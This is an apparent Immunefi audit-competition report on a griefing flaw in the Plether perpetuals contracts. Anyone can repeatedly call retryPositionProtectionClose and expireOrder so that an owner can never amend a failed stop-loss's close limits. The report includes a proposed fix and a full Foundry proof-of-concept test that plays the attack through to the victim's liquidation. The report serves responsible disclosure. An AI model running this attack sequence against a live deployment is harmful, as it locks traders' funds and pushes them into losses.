# \#98399 [SC-High] anyone can stop an owner from amending the close limits of a failed protection

**Submitted on Nov 7th 2026 at 17:15:32 UTC by @Petrus for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98399
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
A permissionless attacker can repeatedly call expireOrder and retryPositionProtectionClose atomically, preventing an EOA owner from reaching the Latched state between transactions and therefore blocking the owner from amending obsolete close limits.

## Vulnerability Details



After a protected close fails, `amendLatchedPositionProtectionCloseLimits` is the owner's only recovery, and it works only while the protection is `Latched` with no pending order. `retryPositionProtectionClose` has the same requirements but no caller check, so anyone can move the protection out of `Latched` before the owner amends. The owner then can't fix the limits that make every close fail.



`PositionProtectionBook.sol`: the owner's only recovery path

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

`PositionProtectionBook.sol`: anyone can leave `Latched`, with no caller check

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }

    if (protection.linkedOrderId == 0 || _attemptProtectionIds[protection.linkedOrderId] != 0) {
        revert PositionProtectionBook__InvalidLinkedOrder();
    }
    uint64 expectedOrderId = router.nextCommitId();
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    if (linkedOrderId != expectedOrderId) {
        revert PositionProtectionBook__InvalidHostResponse();
    }
    _recordCloseAttempt(protection, linkedOrderId);
}
```

`OrderRouter.sol`: anyone can end an expired attempt

```solidity
function expireOrder(
    uint64 orderId
) external nonReentrant returns (OrderV3Types.ExecutionResult memory) {
    orderId;
    return abi.decode(_delegateExecutionSidecar(), (OrderV3Types.ExecutionResult));
}
```

`PositionProtectionBook.sol`: the owner can't cancel a triggered protection

```solidity
if (
    status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
        && status != PositionProtectionTypes.PositionProtectionStatus.Armed
) {
    revert OrderRouter__ProtectionNotArmed();
}
```

`OrderLiquidationBatchLogic.sol`: the owner can't close manually

```solidity
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

## Context

 `retryPositionProtectionClose`()  lets anyone move a failed protection out of `Latched`, the only state where `amendLatchedPositionProtectionCloseLimits` works, so an attacker who keeps retrying first can stop the owner from fixing the limits that block every close.

A normal trader whose stop loss gaps past their debit limit reaches this state, and any address can then call the permissionless `expireOrder` and `retryPositionProtectionClose` for gas alone, provided it lands each retry before the owner's amendment.

The owner can't amend, cancel or close, so their position stays exposed to further losses until it is liquidated, the attacker stops, or the owner wins the ordering race.

## Impact
The owner cannot amend the protection’s limits, cancel the triggered protection, or submit an ordinary manual close while the attacker continues retrying it.

So, the attacker can grief the victim by repeatedly keeping an unsuitable protection close active, leaving the position exposed to additional losses and possible liquidation.


## Attack path
1. The owner's stop triggers, and a price gap makes the close breach their debit limit.
2. The attempt fails or expires, and the protection returns to `Latched`.
3. The attacker calls `retryPositionProtectionClose` before the owner can amend.
4. Each new attempt ends through a keeper failure or `expireOrder`, and the attacker retries again.
5. The owner's amend, cancel and close calls all revert.
6. The price keeps moving, and the position is liquidated.

## Best solution
Let the owner amend while the protection is `Triggered`, so the new limits apply to the next attempt and the live attempt keeps its pinned limits.

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    PositionProtectionTypes.PositionProtectionStatus status = protection.status;
    if (
        status != PositionProtectionTypes.PositionProtectionStatus.Latched
            && status != PositionProtectionTypes.PositionProtectionStatus.Triggered
    ) {
        revert OrderRouter__ProtectionNotLatched();
    }
    uint256 allowedPending = status == PositionProtectionTypes.PositionProtectionStatus.Triggered ? 1 : 0;
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != allowedPending) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

## Proof of Concept

## Proof of Concept

Put the test in this path:  packages/perps/test/perps/audit/

forge test --match-test test_AttackerGriefsOwnerIntoLiquidationOnReleaseParameters -vvvv


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Griefing on release economics: two identical traders hit the same gap near the live 0.961 mark. The untouched
///         trader amends and exits. The attacker keeps renewing the other trader's failing close, whether a keeper
///         executes it or it expires, so that trader can never amend and is liquidated by a small further move.
/// @dev Local stack with the repo's MockPyth, not a fork. Modelled sequence: the attacker lands each retry before the
///      victim's amendment, the victim never adds margin, and the price path is an assumed stress path.
contract ProtectionLatchedLimitsLockoutPoC is BasePerpTest {

    function test_AttackerGriefsOwnerIntoLiquidationOnReleaseParameters() public {
        address victim = address(0xA11CE);
        address control = address(0xC0FFEE);
        address attacker = address(0xBAD);
        address keeper = address(0xE0EC);
        address liquidator = address(0x11D);
        uint256 entryPrice = 96_100_000;
        uint256 stopLossPrice = 96_580_000;
        uint256 gapPrice = 96_700_000;
        uint256 lockPathEndPrice = 97_000_000;
        uint256 liquidationPrice = 97_300_000;
        uint256 positionSize = 10_000e18;
        uint256 positionMargin = 120e6;
        uint256 startingBalance = 20_000e6;
        // Covers the 48 loss expected at the stop plus costs, but not the 60 loss after the gap.
        uint256 grossDebitCeiling = 56e6;

        address[2] memory traders = [victim, control];
        uint64[2] memory openOrderIds;
        uint64[2] memory protectionIds;
        uint64[2] memory attemptIds;

        IPositionProtectionActions actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        IPositionProtectionViews views = IPositionProtectionViews(address(router.positionProtectionBook()));
        bytes32[] memory feedIds = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](feedIds.length);
        bytes[] memory liveData = new bytes[](1);

        // ---- STEP 0 CONFIG: the release economics from manifest.json, applied through the real owner timelock ----
        ICfdEngineAdminHost.EngineRiskConfig memory riskConfig = _engineRiskConfig();
        riskConfig.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1000e6;
        engineAdmin.proposeRiskConfig(riskConfig);
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        routerAdmin.finalizeRouterConfig();

        assertEq(_engineRiskConfig().riskParams.maintMarginBps, 10, "STEP 0: release maintenance margin");
        assertEq(_engineRiskConfig().riskParams.initMarginBps, 20, "STEP 0: release initial margin");
        assertEq(_engineRiskConfig().riskParams.vpiFactor, 0.01e18, "STEP 0: release vpi factor");
        assertEq(engine.executionFeeBps(), 4, "STEP 0: release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "STEP 0: release settlement buffer");
        assertEq(engine.CAP_PRICE(), 2e8, "STEP 0: release cap");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "STEP 0: release minimum open notional");
        assertEq(router.positionProtectionTriggerBountyAssets(), 200_000, "STEP 0: release trigger bounty");
        assertEq(router.maxPendingOrders(), 5, "STEP 0: release pending order cap");

        // ---- STEP 1 SETUP: two identical traders fund, open and protect through the public entrypoints ----
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        for (uint256 i; i < feedIds.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                feedIds[i],
                MockPyth.MockPrice(
                    int64(uint64(entryPrice)), 0, -8, vm.getBlockTimestamp(), uint256(engine.lastMarkTime())
                )
            );
        }
        liveData[0] = abi.encode(ticks);
        vm.prank(keeper);
        router.updateMarkPrice(liveData);
        assertEq(engine.lastMarkPrice(), entryPrice, "STEP 1: mark sits at the live basket level");

        OrderV3Types.OrderRequest memory openRequest;
        openRequest.side = CfdTypes.Side.LONG;
        openRequest.sizeDelta = positionSize;
        openRequest.marginDelta = positionMargin;
        openRequest.targetPrice = 1;
        openRequest.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        for (uint256 t; t < traders.length; ++t) {
            _fundTrader(traders[t], startingBalance);
            openRequest.clientOrderId = keccak256(abi.encode("poc-open", traders[t]));
            vm.prank(traders[t]);
            openOrderIds[t] = router.commitOrder(openRequest);
        }
        for (uint256 t; t < traders.length; ++t) {
            bytes[] memory openData = _mockPythUpdateData(entryPrice);
            vm.prank(keeper);
            OrderV3Types.ExecutionResult memory openResult = router.executeOrder(openOrderIds[t], openData);
            assertEq(uint8(openResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "STEP 1: open executes");
        }

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        for (uint256 i; i < feedIds.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                feedIds[i],
                MockPyth.MockPrice(
                    int64(uint64(entryPrice)), 0, -8, vm.getBlockTimestamp(), uint256(engine.lastMarkTime())
                )
            );
        }
        liveData[0] = abi.encode(ticks);
        vm.prank(keeper);
        router.updateMarkPrice(liveData);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = stopLossPrice;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: grossDebitCeiling,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        for (uint256 t; t < traders.length; ++t) {
            vm.prank(traders[t]);
            protectionIds[t] = actions.createPositionProtection(params);
            (uint256 openedSize,,,,,,) = engine.positions(traders[t]);
            assertEq(openedSize, positionSize, "STEP 1: identical position is open");
            assertEq(
                uint8(views.getPositionProtection(protectionIds[t]).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
                "STEP 1: stop loss is armed"
            );
        }
        (, uint256 victimMarginAtOpen,,,,,) = engine.positions(victim);

        // ---- STEP 2 SETUP: a gap of 0.06% past the stop makes both closes breach the same debit ceiling ----
        for (uint256 t; t < traders.length; ++t) {
            _mockPythUpdateData(gapPrice);
            for (uint256 i; i < feedIds.length; ++i) {
                ticks[i] = MockPyth.FeedUpdate(
                    feedIds[i],
                    MockPyth.MockPrice(
                        int64(uint64(gapPrice)), 0, -8, vm.getBlockTimestamp(), uint256(engine.lastMarkTime())
                    )
                );
            }
            liveData[0] = abi.encode(ticks);
            vm.prank(keeper);
            attemptIds[t] = actions.triggerPositionProtection(protectionIds[t], liveData);
        }
        for (uint256 t; t < traders.length; ++t) {
            bytes[] memory gapData = _mockPythUpdateData(gapPrice);
            vm.prank(keeper);
            OrderV3Types.ExecutionResult memory failedClose = router.executeOrder(attemptIds[t], gapData);
            assertEq(
                uint8(failedClose.terminalReason),
                uint8(OrderV3Types.TerminalReason.ConstraintViolation),
                "STEP 2: close fails on the obsolete limit"
            );
            assertEq(
                uint8(views.getPositionProtection(protectionIds[t]).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
                "STEP 2: relatched, the only state where an owner may amend"
            );
        }

        // ---- STEP 3 CONTROL: nobody interferes with this trader, who amends and exits at the gap price ----
        PositionProtectionTypes.CloseFinancialLimits memory relaxedLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(control);
        actions.amendLatchedPositionProtectionCloseLimits(protectionIds[1], relaxedLimits);
        vm.prank(keeper);
        uint64 controlAttemptId = actions.retryPositionProtectionClose(protectionIds[1]);

        // ---- STEP 4 ATTACK: the attacker retries for the victim first, so the victim cannot amend ----
        vm.prank(attacker);
        uint64 victimAttemptId = actions.retryPositionProtectionClose(protectionIds[0]);
        vm.prank(victim);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        actions.amendLatchedPositionProtectionCloseLimits(protectionIds[0], relaxedLimits);

        bytes[] memory controlData = _mockPythUpdateData(gapPrice);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory controlExit = router.executeOrder(controlAttemptId, controlData);
        assertEq(uint8(controlExit.status), uint8(OrderV3Types.LifecycleStatus.Executed), "STEP 3: control exits");
        (uint256 controlSize,,,,,,) = engine.positions(control);
        assertEq(controlSize, 0, "STEP 3: control position is closed at the gap price");

        OrderV3Types.OrderRequest memory manualClose;
        manualClose.clientOrderId = keccak256("poc-manual-close");
        manualClose.side = CfdTypes.Side.LONG;
        manualClose.sizeDelta = positionSize;
        manualClose.targetPrice = engine.CAP_PRICE();
        manualClose.isClose = true;
        manualClose.bounds = openRequest.bounds;
        manualClose.bounds.submitBy = type(uint64).max;

        // ---- STEP 5 ATTACK: for six hours attempts end by keeper execution or expiry; the attacker renews each one ----
        uint256 lockStart = vm.getBlockTimestamp();
        uint256 lockEnd = lockStart + 6 hours;
        uint256 rounds;
        uint256 keeperEndedRounds;
        while (vm.getBlockTimestamp() < lockEnd) {
            uint256 pathPrice =
                gapPrice + ((lockPathEndPrice - gapPrice) * (vm.getBlockTimestamp() - lockStart)) / 6 hours;
            if (rounds % 2 == 0) {
                // A normal keeper executes the attempt at a rising price, and the old limit fails it again.
                vm.warp(vm.getBlockTimestamp() + 30);
                bytes[] memory keeperData = _mockPythUpdateData(pathPrice);
                vm.prank(keeper);
                OrderV3Types.ExecutionResult memory keeperResult = router.executeOrder(victimAttemptId, keeperData);
                assertEq(
                    uint8(keeperResult.terminalReason),
                    uint8(OrderV3Types.TerminalReason.ConstraintViolation),
                    "STEP 5: the live keeper still cannot close within the old limit"
                );
                ++keeperEndedRounds;
            } else {
                // No keeper reaches this attempt, so the attacker expires it.
                vm.warp(uint256(router.lifecycleBook().orderTiming(victimAttemptId).executionDeadline) + 1);
                vm.roll(vm.getBlockNumber() + 1);
                vm.prank(attacker);
                OrderV3Types.ExecutionResult memory expired = router.expireOrder(victimAttemptId);
                assertEq(
                    uint8(expired.terminalReason),
                    uint8(OrderV3Types.TerminalReason.Expired),
                    "STEP 5: attempt ended by attacker expiry"
                );
            }

            vm.prank(attacker);
            uint64 renewedAttemptId = actions.retryPositionProtectionClose(protectionIds[0]);
            assertGt(renewedAttemptId, victimAttemptId, "STEP 5: fresh attempt each round");
            victimAttemptId = renewedAttemptId;
            ++rounds;

            vm.startPrank(victim);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            actions.amendLatchedPositionProtectionCloseLimits(protectionIds[0], relaxedLimits);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            actions.cancelPositionProtection(protectionIds[0]);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            actions.cancelPositionProtectionAndCommitClose(protectionIds[0], manualClose);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(manualClose);
            vm.stopPrank();
        }

        (uint256 lockedSize, uint256 lockedMargin,,,,,) = engine.positions(victim);
        assertGe(vm.getBlockTimestamp() - lockStart, 1 hours, "STEP 5: the victim was locked for over an hour");
        assertGt(keeperEndedRounds, 100, "STEP 5: the lock survived an active keeper");
        assertEq(lockedSize, positionSize, "STEP 5: the victim's position could not be closed");
        assertGt(lockedMargin, 0, "STEP 5: the victim's margin stayed in the position");
        assertLe(lockedMargin, victimMarginAtOpen, "STEP 5: the victim's margin was never topped up");

        // ---- STEP 6 IMPACT: a further small move lets an unrelated keeper liquidate the locked victim ----
        _mockPythUpdateData(liquidationPrice);
        for (uint256 i; i < feedIds.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                feedIds[i],
                MockPyth.MockPrice(
                    int64(uint64(liquidationPrice)), 0, -8, vm.getBlockTimestamp(), uint256(engine.lastMarkTime())
                )
            );
        }
        liveData[0] = abi.encode(ticks);
        vm.prank(liquidator);
        router.executeLiquidation(victim, liveData);

        (uint256 liquidatedSize,,,,,,) = engine.positions(victim);
        assertEq(liquidatedSize, 0, "STEP 6: the victim was liquidated on release margin");
        assertEq(
            uint8(views.getPositionProtection(protectionIds[0]).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated),
            "STEP 6: the protection ended in liquidation, not in the protected close"
        );

        // ---- STEP 7 IMPACT: griefing proof: the victim lost far more, and the attacker earned nothing ----
        uint256 victimFinal = clearinghouse.balanceAssets(victim) + engine.traderClaimBalanceAssets(victim);
        uint256 controlFinal = clearinghouse.balanceAssets(control) + engine.traderClaimBalanceAssets(control);
        uint256 victimLoss = startingBalance - victimFinal;
        uint256 controlLoss = startingBalance - controlFinal;
        assertGt(victimLoss, controlLoss + 30e6, "STEP 7: the extra loss comes only from the blocked amendment");

        assertEq(settlementToken.balanceOf(attacker), 0, "STEP 7: attacker needed no capital");
        assertEq(clearinghouse.balanceAssets(attacker), 0, "STEP 7: griefing, the attacker earned nothing");
        assertEq(engine.traderClaimBalanceAssets(attacker), 0, "STEP 7: griefing, the attacker has no claim either");
    }

}
```

